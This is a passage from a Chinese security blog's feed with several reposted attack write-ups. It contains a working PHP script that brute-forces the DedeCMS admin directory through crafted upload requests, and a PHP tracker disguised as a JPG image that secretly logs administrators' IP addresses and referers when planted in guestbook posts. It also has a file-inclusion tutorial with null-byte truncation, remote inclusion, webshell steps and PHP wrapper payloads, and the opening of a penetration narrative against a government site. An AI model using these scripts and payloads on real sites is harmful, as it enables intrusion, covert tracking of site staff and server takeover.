class="hljs-variable">$path</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$n</span>)&#123;    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$v</span>)&#123;        <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vv</span>)&#123;            <span class="hljs-comment">#echo $v.$vv .&#x27;----&#x27;;</span>            <span class="hljs-variable">$post_data</span>=<span class="hljs-string">&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=./<span class="hljs-subst">$v</span><span class="hljs-subst">$vv</span>&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;</span>;            <span class="hljs-variable">$result</span>=post(<span class="hljs-variable">$url</span>,<span class="hljs-variable">$post_data</span>);            <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$result</span>,<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;                <span class="hljs-variable">$path</span>=<span class="hljs-variable">$v</span>.<span class="hljs-variable">$vv</span>;<span class="hljs-variable">$n</span>=<span class="hljs-literal">false</span>;<span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-keyword">while</span>(<span class="hljs-variable">$nn</span>)&#123;    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$dic</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$vvv</span>)&#123;        <span class="hljs-variable">$post_data</span>=<span class="hljs-string">&quot;dopost=save&amp;_FILES[b4dboy][tmp_name]=./<span class="hljs-subst">$path</span><span class="hljs-subst">$vvv</span>&lt;/images/admin_top_logo.gif&amp;_FILES[b4dboy][name]=0&amp;_FILES[b4dboy][size]=0&amp;_FILES[b4dboy][type]=image/gif&quot;</span>;        <span class="hljs-variable">$result</span>=post(<span class="hljs-variable">$url</span>,<span class="hljs-variable">$post_data</span>);        <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$result</span>,<span class="hljs-string">&#x27;Upload filetype not allow !&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;            <span class="hljs-variable">$path</span>.=<span class="hljs-variable">$vvv</span>;            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$path</span> . PHP_EOL;            <span class="hljs-variable">$giturl</span>=<span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/images/admin_top_logo.gif&#x27;</span>;            <span class="hljs-keyword">if</span>(@file_get_contents(<span class="hljs-variable">$giturl</span>))&#123;                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$domain</span>.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$path</span>.<span class="hljs-string">&#x27;/&#x27;</span>;                <span class="hljs-variable">$nn</span>=<span class="hljs-literal">false</span>;<span class="hljs-keyword">break</span> <span class="hljs-number">2</span>;            &#125;        &#125;    &#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre><p><img src="/images/20180226_%E8%A7%A3%E5%86%B3DEDECMS%E5%8E%86%E5%8F%B2%E9%9A%BE%E9%A2%98--%E6%89%BE%E5%90%8E%E5%8F%B0%E7%9B%AE%E5%BD%95/03.png" alt="解决DEDECMS历史难题--找后台目录"></p><p>转载自：<a href="https://xianzhi.aliyun.com/forum/topic/2064">https://xianzhi.aliyun.com/forum/topic/2064</a></p>]]></content>
    
    
    <categories>
      
      <category>漏洞复现</category>
      
    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
      <tag>dede</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>访问我的图片就获取你ip和访问地址</title>
    <link href="/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80.html"/>
    <url>/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80.html</url>
    
    <content type="html"><![CDATA[<h3 id="新建个名为-htaccess的文件，内容如下"><a href="#新建个名为-htaccess的文件，内容如下" class="headerlink" title="新建个名为.htaccess的文件，内容如下"></a>新建个名为.htaccess的文件，内容如下</h3><p><code>AddHandler application/x-httpd-php .jpg</code></p><h3 id="新建个1-jpg，内容如下"><a href="#新建个1-jpg，内容如下" class="headerlink" title="新建个1.jpg，内容如下"></a>新建个1.jpg，内容如下</h3><a id="more"></a><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIP</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED&#x27;</span>);        &#125;        <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ip</span>;    &#125;    <span class="hljs-variable">$ip</span> = getIP();    @<span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;    <span class="hljs-variable">$ua</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>].<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;    date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);    <span class="hljs-variable">$date_</span> = date(<span class="hljs-string">&quot;Y.m.d,h:i:sa&quot;</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<span class="hljs-comment">//记录后台地址等信息</span>    <span class="hljs-variable">$hack</span> = <span class="hljs-string">&#x27;date: &#x27;</span>.<span class="hljs-variable">$date_</span>.<span class="hljs-string">&#x27;ip:&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-string">&#x27;referer: &#x27;</span>.<span class="hljs-variable">$referer</span>.<span class="hljs-string">&#x27;ua: &#x27;</span>.<span class="hljs-variable">$ua</span>;    <span class="hljs-variable">$hack</span> = filter_dangerous_words(<span class="hljs-variable">$hack</span>);    <span class="hljs-variable">$op</span> = fopen(<span class="hljs-string">&#x27;hack.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>);    fwrite(<span class="hljs-variable">$op</span>,<span class="hljs-variable">$hack</span>);    fclose(<span class="hljs-variable">$op</span>);<span class="hljs-comment">//伪装成图片</span>    <span class="hljs-variable">$im</span> = imagecreatefromjpeg(<span class="hljs-string">&quot;2.jpg&quot;</span>);<span class="hljs-comment">//注意该目录下，也要有2.jpg这个图片</span>    header(<span class="hljs-string">&#x27;Content-Type: image/jpeg&#x27;</span>);    imagejpeg(<span class="hljs-variable">$im</span>);    imagedestroy(<span class="hljs-variable">$im</span>); <span class="hljs-meta">?&gt;</span></code></pre><h3 id="放个正常图片，名为2-jpg。"><a href="#放个正常图片，名为2-jpg。" class="headerlink" title="放个正常图片，名为2.jpg。"></a>放个正常图片，名为2.jpg。</h3><h3 id="访问http-127-0-0-1-1-jpg"><a href="#访问http-127-0-0-1-1-jpg" class="headerlink" title="访问http://127.0.0.1/1.jpg"></a>访问<a href="http://127.0.0.1/1.jpg">http://127.0.0.1/1.jpg</a></h3><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>在留言板或者申请友链页面填信息，然后提交</p><p><img src="/images/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/01.png" alt="访问我的图片就获取你ip和访问地址"></p><p>等管理员在后台审核的时候看到这图片</p><p><img src="/images/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/02.png" alt="02"></p><p>此时就会在你该文件的相同目录下生成一个hack.txt</p><p><img src="/images/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/03.png" alt="03"></p><p>这样就获取到后台地址了。</p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>谈一谈文件包含漏洞</title>
    <link href="/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html"/>
    <url>/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E.html</url>
    
    <content type="html"><![CDATA[<h2 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h2><hr><blockquote><p>文件包含这个漏洞，简单来说既是程序猿在开发中为了方便，会将在多个页面重复使用的代码单独写到一个文件中，在需要用到的地方直接包含进来，包含后的文件既相当于将被包含的整个文件内容复制到了包含处。因为在开发中是经常用到的，因此成为了攻击者的目标，便衍生了多种文件包含的攻击。</p></blockquote><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><hr><a id="more"></a><p>先来感受一下，当包含值可被直接控制的情况下是怎么样的如以下代码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);</code></pre><p>可看到以上代码，直接包含的 <code>$file</code> 这种情况下呢，就是可控的情况。</p><blockquote><p>先说一下文件包含的一个要点：文件包含可以包含任意文件，即便被包含的文件并不是与当前编程语言相关，甚至为图片，只要被包含的文件，其内容会被包含文件包含，并以包含文件当前语言执行。</p></blockquote><p>首先在当前文件夹内随便创建任意后缀格式的文件，如：<code>file.txt</code> （就算是图片格式那么效果也是如下）文件内容如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    phpinfo();</code></pre><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/01.png" alt="谈一谈文件包含漏洞"></p><p>文件包含漏洞在支持包含<code>web</code>应用内的目录的同时也直冲包含当前服务器内的其它文件，如下：<br>尝试包含<code>C盘</code>里的某个内容。如：<code>C:\WINDOWS\system.ini</code></p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/02.png" alt="谈一谈文件包含漏洞"></p><p>可看到是直接被包含进来的。</p><p>那么上面说的是传入的文件值为全部可控的情况下的方法，那么如果程序猿在开发中固定死了所包含的文件后缀的话，怎么办？代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] . <span class="hljs-string">&#x27;.php&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);</code></pre><p>这种情况下，我们按照上面的方法尝试一下,为了方便看到直观效果，这里<br>是将<code>$file</code>输出了。</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/03.png" alt="谈一谈文件包含漏洞"></p><p>我们可以看到，如果在程序中固定死了后缀，那么就像上图一样，将会找不到需要包含的文件。可看到最后所包含的文件名为：<code>./include.txt.php</code>。</p><p>因此这就可以使用另一种方法，就是：<code>%00</code>截断。那么<code>%00</code>截断呢，是可以使用在非常多的地方的，这里不多讲。想了解的童鞋可以网上查一查相关资料。</p><p>这里先说一下PHP中使用<code>%00</code>的前提：</p><ol><li>PHP版本 &lt; 5.3 (不包括5.3) ;</li><li>PHP<code>magic_quotes_gpc = off</code>;</li><li>PHP对所接收的参数，如以上代码的<code>$_GET[&#39;file&#39;]</code>未使用<code>addslashes</code>函数</li></ol><p>因为PHP大于等于5.3的版本已经修复了这个问题，如果开启了<code>gpc</code>或者使用了<code>addslashes</code>函数的话则会对其进行转义。<br>首先我们可以试试如果在<code>gpc</code>开启的情况下会出现什么情况（效果与使用函数的为一致）</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/04.png" alt="谈一谈文件包含漏洞"></p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/05.png" alt="谈一谈文件包含漏洞"></p><p>可以看到了。效果是非常的明显。</p><p>接下来看看在5.3的情况是什么样的</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/06.png" alt="谈一谈文件包含漏洞"></p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/07.png" alt="谈一谈文件包含漏洞"></p><p>也可以看到。是没有任何效果的。</p><p>因此我们可以得知只要满足以上三种情况，那么就可以使用<code>%00</code>；<br>首先我们将PHP版本更换为5.2，然后在<code>php.ini</code>将 <code>magic_quotes_gpc = on</code>改为<code>magic_quotes_gpc = off</code>之后重启 <code>Apache</code>，在尝试下使用截断。</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/08.png" alt="谈一谈文件包含漏洞"></p><p>成功使用截断包含。那么文件包含就只有包含的功能吗？那肯定不是的，既然是文件包含，那么我们可以直接包含一句话。先创建一个文件：<code>shell.txt</code>内容为一句话。</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/09.png" alt="谈一谈文件包含漏洞"></p><p>可以看到，拿<code>shell</code>不是什么问题。</p><p>那么这两种包含有什么区别呢？其实是没有区别的，原理都一样，只不过第一种是将后缀一起传入，第二种则在程序内固定死了后缀。但是可以使用<code>%00</code>因为当程序流遇到<code>%00</code>终止符的时候将直接终止。</p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><blockquote><p>本地文件包含与远程文件包含的原理是相同的，不同点就是前者只能包含服务器内存在的文件，后者则可包含远程服务器内的文件。</p></blockquote><p>远程文件包含的注意点：</p><ol><li>需要 <code>php.ini</code> 内的 <code>allow_url_include = on</code> 以及 <code>allow_url_fopen=on</code></li><li>所需包含的远程文件后缀格式不能以目标服务器的语言相同，如（目标服务器解析PHP代码，那么远程文件后缀格式则不能为 <code>PHP</code> ）</li></ol><p>来解释一下第二点：因为如果你的远程文件是<code>php</code>后缀的话，那么如果你远程文件内容为：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    phpinfo();</code></pre><p>那么在目标服务器内拿到的内容则是你的远程服务器执行<code>phpinfo()</code>后的一个内容，并不是这段代码，因此包含得到的信息并不是目标服务器的而是你远程服务器的。如下：<br><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/10.png" alt="谈一谈文件包含漏洞"></p><p>这个是我远程机的信息，为php5.6版本，目标机的是5.2版本。接下来包含一下。<br><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/11.png" alt="谈一谈文件包含漏洞"></p><p>可以看到，包含后得到的结果就是我们远程机的，为什么呢？？<br>因为目标服务器包含的代码并不是：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></code></pre><p>而是远程服务器执行完这段代码的源代码，如下图：</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/12.png" alt="谈一谈文件包含漏洞"></p><p>所以说远程文件包含只有符合了以上两点才能正常包含。<br>先来修改下：</p><ol><li><p>修改配置<br><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/13.png" alt="谈一谈文件包含漏洞"></p></li><li><p>修改文件后缀<br><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/14.png" alt="谈一谈文件包含漏洞"></p></li></ol><p>再来包含一下。<br><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/15.png" alt="谈一谈文件包含漏洞"></p><p>可以看到这次包含后返回的信息就是我们目标机的信息。</p><p>接下来继续尝试拿shell<br><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16.png" alt="谈一谈文件包含漏洞"></p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/17.png" alt="谈一谈文件包含漏洞"></p><p>远程文件包含的利用前提其实就是符合本地文件包含的前提并且符合远程文件包含本身的前提即可利用。</p><h2 id="文件包含之伪协议"><a href="#文件包含之伪协议" class="headerlink" title="文件包含之伪协议"></a>文件包含之伪协议</h2><hr><p>伪协议在文件包含的利用，本文演示以下伪协议：<br><code>data:text/plain</code> 或 <code>data:text/plain;base64</code><br><code>php://input</code><br><code>php://filter</code><br><code>file://</code><br><code>zip://</code></p><p>其它协议可阅读官方文档：<a href="http://php.net/manual/zh/wrappers.php.php" title="直通车">直通车</a></p><p>data:text/plain</p><p>直接在对应URL参数内输出：<code>data:text/plain</code>,需要执行的php代码  如下图：<br><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/18.png" alt="谈一谈文件包含漏洞"></p><p>这个伪协议还有另一种使用方法，那么就是将需要执行的php代码使用base64编码：<code>data:text/plain;base64</code>,需要执行的<code>base64php</code>代码 如下图：<br><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/19.png" alt="谈一谈文件包含漏洞"></p><hr><p> php://input</p><p><code>php://input</code> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/20.png" alt="谈一谈文件包含漏洞"></p><p>可以看到程序内是固定死后缀的，那么在包含 <code>php://input</code> 的时候就会自动拼接上 <code>.php</code> 所以肯定是不能正常使用 <code>php://input</code>的。所以我们也是可以使用 <code>%00</code> 截断的</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/22.png" alt="谈一谈文件包含漏洞"></p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/23.png" alt="谈一谈文件包含漏洞"></p><p>可以看到终止符是非常强大的。</p><hr><p>php://filter</p><p><code>php://filter</code> 该伪协议可以读取php文件代码以base64编码输出，比如说我们想读取一个php文件但是不想让它正常php执行代码后的结果，我们想要这个php文件的代码的时候就可以使用这个伪协议。<br>使用方法：php://filter/read=convert.base64-encode/resource=需要读取的文件代码内容</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/24.png" alt="谈一谈文件包含漏洞"></p><p>解码后可得到内容</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/25.png" alt="谈一谈文件包含漏洞"></p><hr><p>file://</p><p><code>file://</code> 用于访问本地文件系统，且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br>使用方法：file://文件绝对路径</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/26.png" alt="谈一谈文件包含漏洞"></p><hr><p>zip://</p><p><code>zip://</code>可以访问压缩文件中的文件。但是需要绝对路径。<br>使用方法：zip://[压缩包绝对路径]#[压缩文件内的文件名]</p><p>在本地创建一个文件，并且压缩成zip压缩包。</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/27.png" alt="谈一谈文件包含漏洞"></p><p>可以看到我已经填写了绝对路径以及文件名称，但是为什么不能成功包含呢，可以看到它的报错 <code>Warning: include(zip://C:/phpStudy/WWW/include/phpinfo.zip.php) </code> 我们并不是包含这个文件，我们是要包含这个zip里面的文件，为什么<code>#</code>后面的值没了呢，是因为#会忽略后边的参数，所以我们需要使用编码<code>%23</code>的形式，还有一点就是程序里固定死了 php后缀，因为我们压缩的文件是为php后缀的。所以我们就不用带后缀了，如下图：</p><p><img src="/images/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/28.png" alt="谈一谈文件包含漏洞"></p><p>转载自：<a href="http://www.bugsafe.cn/archives/167.html" title="http://www.bugsafe.cn/archives/167.html">http://www.bugsafe.cn/archives/167.html</a></p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一个项目中遇到的奇葩站点</title>
    <link href="/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9.html"/>
    <url>/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/%E4%B8%80%E6%AC%A1%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9.html</url>
    
    <content type="html"><![CDATA[<p>在做项目的时候遇到的一个gov，因为涉及一些敏感信息，就打重马了。</p><p>其他站太难搞了，挑个软柿子捏，当看到这个首页时，直觉就告诉我这站一定有问题。</p><a id="more"></a><p><img src="/images/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/01.png" alt="一个项目中遇到的奇葩站点"></p><p>习惯性的一拿到站就查看robots文件。</p><p><img src="/images/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/02.png" alt="一个项目中遇到的奇葩站点"></p><p>简单的看了下服务器的架构，知道是iis7.5的，于是在该文件后尝试解析漏洞。</p><p><img src="/images/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/03.png" alt="一个项目中遇到的奇葩站点"></p><p>没有报错，从经验来看，这页面风格确实是执行php脚本的风格。</p><p>然后在随便找了个图片尝试。</p><p><img src="/images/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/04.png" alt="一个项目中遇到的奇葩站点"></p><p>猜测是该目录没有执行脚本的权限。</p><p>这时候本来想找到个上传点上传张图片马，然后尝试拿shell。</p><p>但此时我有个大胆的想法。将asp以php的方法来执行试试。</p><p><img src="/images/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/05.png" alt="一个项目中遇到的奇葩站点"></p><p>报错了，源码也暴露了出来，然后祭出扫描器扫了一波敏感文件，找到了其配置文件。</p><p><img src="/images/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/06.png" alt="一个项目中遇到的奇葩站点"></p><p>就这样，数据库路径找到了，当我去访问的时候却出现了意外。</p><p><img src="/images/20171220_%E4%B8%80%E4%B8%AA%E9%A1%B9%E7%9B%AE%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E5%A5%87%E8%91%A9%E7%AB%99%E7%82%B9/07.png" alt="一个项目中遇到的奇葩站点"></p><p>显示404，这尼玛什么鬼。。。</p><p>继续在后面加./php尝试，奇迹又出现了。</p><p><img 